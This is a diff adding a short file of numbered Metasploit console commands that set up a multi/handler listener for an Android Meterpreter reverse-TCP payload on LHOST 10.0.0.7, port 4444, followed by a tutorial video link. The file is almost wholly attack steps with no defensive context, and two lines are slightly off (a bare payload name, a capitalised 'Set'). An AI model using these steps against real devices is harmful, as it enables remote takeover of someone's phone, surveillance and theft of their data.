@@ -1,0 +1,15 @@
+command 1: msfconsole
+
+command 2: use exploit/multi/handler
+
+command 3: set payload android/meterpreter/reverse_tcp
+
+command 4: android/meterpreter/reverse_tcp
+
+command 5: set LHOST 10.0.0.7
+
+command 6: Set LPORT 4444
+
+command 7: exploit
+
+Tutorial Video: https://www.youtube.com/watch?v=hDsdpbAWrKA
